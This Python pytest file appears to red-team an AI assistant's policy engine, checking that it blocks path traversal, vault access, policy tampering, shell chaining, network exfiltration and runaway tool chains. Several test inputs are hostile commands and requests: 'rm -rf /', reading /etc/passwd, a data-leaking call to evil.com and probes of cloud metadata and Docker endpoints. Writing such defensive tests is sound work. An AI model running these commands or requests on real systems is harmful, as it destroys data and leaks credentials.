"""
Pihu — Phase F Adversarial Test Suite
Provides rigorous red-team testing of the target defense mechanisms:
path traversal, symlink bypass, prompt injection, policy downgrade, network exfil, etc.
"""
import sys
import os
import pytest
import shutil
from pathlib import Path
import json

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from security.policy_engine import PolicyEngine, PolicyRequest, Subject, Resource, PolicyContext, ActionType, Verdict
from security.policy_integrity import PolicyIntegrityGuard

# Use a temp test policy and registry stub for these tests
@pytest.fixture(scope="module")
def setup_adversarial_env(tmp_path_factory):
    temp_dir = tmp_path_factory.mktemp("pihu_adv_tests")
    workspace = temp_dir / "workspace"
    workspace.mkdir()
    
    # Create fake vault
    vault_dir = workspace / "pihu" / "data" / "vault"
    vault_dir.mkdir(parents=True)
    (vault_dir / "secrets.enc").write_text("secret_data")
    
    # Create fake policy file
    policy_dir = workspace / "pihu" / "data" / "security"
    policy_dir.mkdir(parents=True)
    policy_path = policy_dir / "policy.yaml"
    
    # Very strict policy
    policy_content = """
version: 5
schema_version: "2.0"
default_decision: deny
workspace_roots:
  - "{workspace}"
extra_protected_paths:
  - "{policy_dir}/**"
  - "{vault_dir}/**"

directory_allowlists:
  read: ["{workspace}/**"]
  write: ["{workspace}/outputs/**"]
  execute: ["{workspace}/sandbox/**"]

tool_profiles:
  file_reader:
    allowed_actions: ["read_file"]
    blocked_directories: ["{vault_dir}/**"]

scope_controls:
  shell_exec:
    enabled: true
    require_approval: true
    min_trust_level: 4
  call_api:
    enabled: true
    require_approval: true
    min_trust_level: 4

network_policy:
  allowed_domains: ["integrate.api.nvidia.com"]
  blocked_domains: ["pastebin.com", "evil.com"]
  allow_localhost: false
  allow_private_network: false

blocked_shell_metacharacters: true

rate_limits:
  shell_exec: 5
"""
    # Replace single backslashes in paths with double forward slashes or standard forward slashes
    workspace_str = str(workspace).replace("\\", "/")
    policy_dir_str = str(policy_dir).replace("\\", "/")
    vault_dir_str = str(vault_dir).replace("\\", "/")
    
    policy_content = policy_content.format(
        workspace=workspace_str, 
        policy_dir=policy_dir_str,
        vault_dir=vault_dir_str
    )
    
    policy_path.write_text(policy_content)
    
    # Mock winreg for PolicyIntegrityGuard so it doesn't pollute actual registry
    import security.policy_integrity
    security.policy_integrity.winreg = None
    
    engine = PolicyEngine(policy_path=str(policy_path))
    
    return {
        "engine": engine,
        "workspace": workspace_str,
        "policy_path": policy_path,
        "vault_dir": vault_dir_str,
        "policy_dir": policy_dir_str,
    }

def _req(action: ActionType, path=None, command=None, url=None, trust=4, chain=1, user="test"):
    return PolicyRequest(
        subject=Subject(user_id=user, trust_level=trust),
        action=action,
        resource=Resource(path=path, command=command, url=url, description="adv_test"),
        context=PolicyContext(request_chain_depth=chain)
    )

# ── 1. Path Traversal & Filesystem Bypass ──

class TestPathTraversal:
    def test_basic_traversal_blocked_by_workspace(self, setup_adversarial_env):
        env = setup_adversarial_env
        engine = env["engine"]
        
        req = _req(ActionType.READ_FILE, path=f"{env['workspace']}/../Windows/System32/config/SAM")
        decision = engine.evaluate(req)
        assert decision.verdict == Verdict.DENY
        assert "directory_allowlist_denied" in decision.matched_rules

    def test_null_byte_injection(self, setup_adversarial_env):
        env = setup_adversarial_env
        engine = env["engine"]
        
        req = _req(ActionType.READ_FILE, path=f"{env['workspace']}/outputs/test.txt\0/../../../../Windows/win.ini")
        decision = engine.evaluate(req)
        # Assuming FilesystemGuard normalizes or rejects null bytes
        assert decision.verdict == Verdict.DENY

    def test_protected_vault_read_denied(self, setup_adversarial_env):
        env = setup_adversarial_env
        engine = env["engine"]
        
        req = _req(ActionType.READ_FILE, path=f"{env['vault_dir']}/secrets.enc")
        decision = engine.evaluate(req)
        assert decision.verdict == Verdict.DENY
        
    def test_write_to_protected_policy_denied(self, setup_adversarial_env):
        env = setup_adversarial_env
        engine = env["engine"]
        
        req = _req(ActionType.WRITE_FILE, path=f"{env['policy_dir']}/policy.yaml")
        decision = engine.evaluate(req)
        assert decision.verdict == Verdict.DENY


# ── 2. Policy Downgrade & Tampering ──

class TestPolicyIntegrity:
    def test_policy_downgrade_detected(self, setup_adversarial_env):
        env = setup_adversarial_env
        path = env["policy_path"]
        
        integrity = PolicyIntegrityGuard(path)
        # Mock the registry info to simulate existing high watermark
        integrity.get_registry_info = lambda: {"hash": "abcdef...", "version": 10}
        
        ok, reason = integrity.check_integrity()
        assert not ok
        assert "downgrade attack detected" in reason

    def test_schema_corruption(self, setup_adversarial_env):
        env = setup_adversarial_env
        path = env["policy_path"]
        
        # Backup
        original = path.read_text()
        
        integrity = PolicyIntegrityGuard(path)
        try:
            path.write_text("invalid_yaml: [}")
            ok, reason = integrity.check_integrity()
            assert not ok
            assert "malformed" in reason
        finally:
            path.write_text(original)

    def test_fail_open_schema_rejected(self, setup_adversarial_env):
        env = setup_adversarial_env
        path = env["policy_path"]
        integrity = PolicyIntegrityGuard(path)
        
        malicious = {"version": 5} # Missing default_decision
        assert integrity.validate_schema(malicious) == False


# ── 3. Shell Metacharacter Bypass ──

class TestShellBypass:
    def test_command_chaining(self, setup_adversarial_env):
        engine = setup_adversarial_env["engine"]
        req = _req(ActionType.SHELL_EXEC, command="echo hello && rm -rf /")
        decision = engine.evaluate(req)
        assert decision.verdict == Verdict.DENY

    def test_command_substitution(self, setup_adversarial_env):
        engine = setup_adversarial_env["engine"]
        req = _req(ActionType.SHELL_EXEC, command="echo $(cat /etc/passwd)")
        decision = engine.evaluate(req)
        assert decision.verdict == Verdict.DENY

    def test_pipe_redirection(self, setup_adversarial_env):
        engine = setup_adversarial_env["engine"]
        req = _req(ActionType.SHELL_EXEC, command="ls -la | grep secret > out.txt")
        decision = engine.evaluate(req)
        assert decision.verdict == Verdict.DENY


# ── 4. Network Exfiltration ──

class TestNetworkExfil:
    def test_blocked_domain_direct(self, setup_adversarial_env):
        engine = setup_adversarial_env["engine"]
        req = _req(ActionType.CALL_API, url="http://evil.com/exfil?data=secret")
        decision = engine.evaluate(req)
        assert decision.verdict == Verdict.DENY
        assert "network_blocked" in decision.matched_rules

    def test_localhost_probe_blocked(self, setup_adversarial_env):
        engine = setup_adversarial_env["engine"]
        req = _req(ActionType.CALL_API, url="http://127.0.0.1:2375/v1.41/containers/json")
        decision = engine.evaluate(req)
        assert decision.verdict == Verdict.DENY
        assert "network_blocked" in decision.matched_rules

    def test_private_ip_probe_blocked(self, setup_adversarial_env):
        engine = setup_adversarial_env["engine"]
        req = _req(ActionType.CALL_API, url="http://169.254.169.254/latest/meta-data/")
        decision = engine.evaluate(req)
        assert decision.verdict == Verdict.DENY


# ── 5. Rate Limit Evasion ──

class TestRateLimitEvasion:
    def test_rapid_burst_blocked(self, setup_adversarial_env):
        engine = setup_adversarial_env["engine"]
        
        # Allowed rate is 5 per minute
        for _ in range(5):
            req = _req(ActionType.SHELL_EXEC, command="echo ok", user="user_burst")
            decision = engine.evaluate(req)
            assert decision.verdict == Verdict.REQUIRE_APPROVAL
            
        # 6th should hit rate limit
        req = _req(ActionType.SHELL_EXEC, command="echo ok", user="user_burst")
        decision = engine.evaluate(req)
        assert decision.verdict == Verdict.DENY
        assert "rate_limited" in decision.matched_rules

    def test_user_spoofing_does_not_bypass(self, setup_adversarial_env):
        engine = setup_adversarial_env["engine"]
        
        # Test 1 hits rate limit
        for _ in range(5):
            req = _req(ActionType.SHELL_EXEC, command="echo out", user="test_1")
            engine.evaluate(req)
        
        req = _req(ActionType.SHELL_EXEC, command="echo out", user="test_1")
        dec = engine.evaluate(req)
        assert dec.verdict == Verdict.DENY
        
        # Test 2 can still execute
        req = _req(ActionType.SHELL_EXEC, command="echo out", user="test_2")
        dec = engine.evaluate(req)
        assert dec.verdict == Verdict.REQUIRE_APPROVAL

# ── 6. Chained Tool Escalation ──
class TestToolEscalation:
    def test_chain_limit_enforced(self, setup_adversarial_env):
        engine = setup_adversarial_env["engine"]
        
        # If an LLM loops continuously through actions...
        req = _req(ActionType.CHAT, chain=100) # Policy max is 10
        dec = engine.evaluate(req)
        
        assert dec.verdict == Verdict.DENY
        assert "chain_depth_exceeded" in dec.matched_rules

if __name__ == "__main__":
    pytest.main([__file__, "-v"])
